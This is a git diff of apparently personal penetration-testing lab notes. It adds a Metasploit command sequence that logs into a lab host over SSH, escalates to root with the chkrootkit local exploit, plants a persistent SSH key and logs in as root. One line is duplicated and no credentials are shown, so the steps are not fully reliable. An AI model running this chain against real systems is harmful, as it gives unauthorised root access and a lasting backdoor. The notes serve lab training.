@@ -1534,7 +1534,7 @@ set LHOST 192.14.195.2
 exploit
 cat /root/flag
 ```
-78) Post Exploitation Lab II
+78) Post Exploitation Lab II **NOT FINISHED**
 ```
 nmap -sS -sV -p- 192.91.98.3
 use exploit/linux/samba/is_known_pipename
@@ -1569,7 +1569,31 @@ run
 use post/linux/manage/sshkey_persistence
 set SESSION 1
 run 
-```    
+```
+79) Establishing Persistence On Linux
+```
+ifconfig
+msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.182.80.3
+set USERNAME jackie
+set USERNAME jackie
+run
+sessions -u 1
+use exploit/unix/local/chkrootkit
+set SESSION 2
+set CHKROOTKIT /bin/chkrootkit
+run
+sessions -u 3
+use post/linux/manage/sshkey_persistence
+set SESSION 4
+set CREATESSHFOLDER true
+exploit
+loot
+chmod 0400 ssh_key
+ssh -i ssh_key root@192.182.80.3
+
+```   
 
 
 
